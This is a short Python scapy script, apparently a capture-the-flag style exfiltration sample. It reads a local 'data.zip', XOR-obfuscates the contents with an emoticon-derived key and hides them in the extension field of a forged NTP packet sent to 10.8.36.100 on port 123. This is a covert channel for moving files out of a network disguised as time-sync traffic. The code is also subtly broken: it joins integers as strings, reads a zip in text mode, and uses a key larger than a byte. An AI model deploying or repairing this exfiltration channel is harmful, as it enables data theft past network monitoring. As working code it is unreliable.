from scapy.all import *
from scapy.fields import *

class CustomNTP(Packet):
    name = "CustomNTP"
    fields_desc = [
        BitField("LeapIndicator", 0, 2),
        BitField("VersionNumber", 3, 3),
        BitField("Mode", 3, 3),
        ByteField("Stratum", 0),
        ByteField("Poll", 6),
        SignedByteField("Precision", -6),
        IntField("RootDelay", 0),
        IntField("RootDispersion", 0),
        IntField("ReferenceIdentifier", 0),
        IntField("ReferenceTimestampSeconds", 0),
        IntField("ReferenceTimestampFraction", 0),
        IntField("OriginateTimestampSeconds", 0),
        IntField("OriginateTimestampFraction", 0),
        IntField("ReceiveTimestampSeconds", 0),
        IntField("ReceiveTimestampFraction", 0),
        IntField("TransmitTimestampSeconds", 0),
        IntField("TransmitTimestampFraction", 0),
        FieldLenField("ExtensionLength", None, length_of="Extension", fmt="!H"),
        StrLenField("Extension", "", length_from=lambda pkt:pkt.ExtensionLength)
    ]

    def post_build(self, p, pay):
        if self.ExtensionLength is None:
            length = len(p) - 40  # 40 bytes up to and including Transmit Timestamp
            p = p[:40] + struct.pack("!H", length) + p[42:]
        return Packet.post_build(self, p, pay)


def send_ntp_packet(dst_ip, key_identifier):
    # Prepare the extension field with "hello" padded to 16 bytes
    extension_field = key_identifier.ljust(16, '\0')
    ntp = CustomNTP(Extension=extension_field, ExtensionLength=len(extension_field))
    ip = IP(dst=dst_ip)
    udp = UDP(sport=123, dport=123)  # NTP uses port 123
    pkt = ip/udp/ntp
    send(pkt)

password = sum([ord(i) for i in '(͡°͜ʖ͡°)'])
data = ''
with open('data.zip', 'r') as f:
    data = f.read()


send_ntp_packet("10.8.36.100", f"{''.join([ord(i) ^ password for i in data])}")
